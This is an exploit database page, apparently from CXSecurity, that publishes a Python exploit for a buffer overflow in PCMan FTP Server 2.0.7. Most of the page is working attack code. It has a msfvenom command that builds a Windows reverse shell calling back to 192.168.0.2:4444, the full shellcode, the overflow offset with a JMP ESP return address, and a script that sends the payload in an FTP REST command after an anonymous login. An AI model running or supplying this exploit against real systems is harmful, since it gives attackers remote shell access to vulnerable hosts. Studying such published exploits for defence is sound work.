---
title: PCMan 2.0.7 Buffer Overflow
url: https://cxsecurity.com/issue/WLB-2026080010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-08-21
fetch_date: 2026-08-22T02:50:39.087875
---

# PCMan 2.0.7 Buffer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PCMan 2.0.7 Buffer Overflow** **2026.08.21**  Credit:  **[Thiago Cunha](https://cxsecurity.com/author/Thiago%2BCunha/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2025-4871](https://cxsecurity.com/cveshow/CVE-2025-4871/ "Click to see CVE-2025-4871")**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |

# Exploit Title: PCMan FTP Server 2.0.7 - Buffer Overflow
# Google Dork: [if applicable]
# Date: 05/18/2025
# Exploit Author: Thiago Cunha - A.K.A. Blu3B3@rd
# Vendor Homepage: http://pcman.openfoundry.org/
# Software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# Version: 2.0.7
# Tested on: Windows XP Professional, Service Pack 2 and Service Pack 3
# CVE : CVE-2025-4871
import socket
import time
# The command to generate shellcode
# msfvenom -p windows/shell\_reverse\_tcp lhost=192.168.0.2 lport=4444 EXITFUNC=thread -b '\x00\x0a\x0d' -a x86 --platform Windows -f python
# Version 5.1 (Build 2600.xpsp.080413-3111 : Service Pack 2)
# Tested on Windows XP 2 and 3 English
buf = ""
buf += "\xbd\xcc\x95\x24\x8c\xda\xdb\xd9\x74\x24\xf4\x5a\x33\xc9"
buf += "\xb1\x52\x31\x6a\x12\x83\xc2\x04\x03\xa6\x9b\xc6\x79\xca"
buf += "\x4c\x84\x82\x32\x8d\xe9\x0b\xd7\xbc\x29\x6f\x9c\xef\x99"
buf += "\xfb\xf0\x03\x51\xa9\xe0\x90\x17\x66\x07\x10\x9d\x50\x26"
buf += "\xa1\x8e\xa1\x29\x21\xcd\xf5\x89\x18\x1e\x08\xc8\x5d\x43"
buf += "\xe1\x98\x36\x0f\x54\x0c\x32\x45\x65\xa7\x08\x4b\xed\x54"
buf += "\xd8\x6a\xdc\xcb\x52\x35\xfe\xea\xb7\x4d\xb7\xf4\xd4\x68"
buf += "\x01\x8f\x2f\x06\x90\x59\x7e\xe7\x3f\xa4\x4e\x1a\x41\xe1"
buf += "\x69\xc5\x34\x1b\x8a\x78\x4f\xd8\xf0\xa6\xda\xfa\x53\x2c"
buf += "\x7c\x26\x65\xe1\x1b\xad\x69\x4e\x6f\xe9\x6d\x51\xbc\x82"
buf += "\x8a\xda\x43\x44\x1b\x98\x67\x40\x47\x7a\x09\xd1\x2d\x2d"
buf += "\x36\x01\x8e\x92\x92\x4a\x23\xc6\xae\x11\x2c\x2b\x83\xa9"
buf += "\xac\x23\x94\xda\x9e\xec\x0e\x74\x93\x65\x89\x83\xd4\x5f"
buf += "\x6d\x1b\x2b\x60\x8e\x32\xe8\x34\xde\x2c\xd9\x34\xb5\xac"
buf += "\xe6\xe0\x1a\xfc\x48\x5b\xdb\xac\x28\x0b\xb3\xa6\xa6\x74"
buf += "\xa3\xc9\x6c\x1d\x4e\x30\xe7\xe2\x27\x8a\x7f\x8a\x35\xea"
buf += "\x6e\x17\xb3\x0c\xfa\xb7\x95\x87\x93\x2e\xbc\x53\x05\xae"
buf += "\x6a\x1e\x05\x24\x99\xdf\xc8\xcd\xd4\xf3\xbd\x3d\xa3\xa9"
buf += "\x68\x41\x19\xc5\xf7\xd0\xc6\x15\x71\xc9\x50\x42\xd6\x3f"
buf += "\xa9\x06\xca\x66\x03\x34\x17\xfe\x6c\xfc\xcc\xc3\x73\xfd"
buf += "\x81\x78\x50\xed\x5f\x80\xdc\x59\x30\xd7\x8a\x37\xf6\x81"
buf += "\x7c\xe1\xa0\x7e\xd7\x65\x34\x4d\xe8\xf3\x39\x98\x9e\x1b"
buf += "\x8b\x75\xe7\x24\x24\x12\xef\x5d\x58\x82\x10\xb4\xd8\xa2"
buf += "\xf2\x1c\x15\x4b\xab\xf5\x94\x16\x4c\x20\xda\x2e\xcf\xc0"
buf += "\xa3\xd4\xcf\xa1\xa6\x91\x57\x5a\xdb\x8a\x3d\x5c\x48\xaa"
buf += "\x17"
# The target and port
target\_ip = "192.168.0.5"
target\_port = 21
# Exploit estructed
offset = b"A" \* 2006
eip = b"\xd9\x2f\xe3\x74" # JMP ESP
nops = b"\x90" \* 20 # Sled NOP
payload = offset + eip + nops + buf
# Connect to target
try:
sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
sock.connect((target\_ip, target\_port))
print(f"[+] Conectado a {target\_ip}:{target\_port}")
except Exception as e:
print(f"[-] Error to connect: {e}")
exit(1)
# Receive banner
banner = sock.recv(1024)
print(banner.decode(errors='ignore'))
# Send user
sock.sendall(b"USER anonymous\r\n")
print(sock.recv(1024).decode(errors='ignore'))
time.sleep(1)
#Send pass
sock.sendall(b"PASS anonymous\r\n")
print(sock.recv(1024).decode(errors='ignore'))
time.sleep(1)
# Send payload to exploiting buffer Overflow
exploit\_command = b"REST " + payload + b"\r\n"
sock.sendall(exploit\_command)
print(sock.recv(1024).decode(errors='ignore'))
time.sleep(1)
Close Connection
sock.close()
print("[+] Conexão encerrada.")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026080010)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top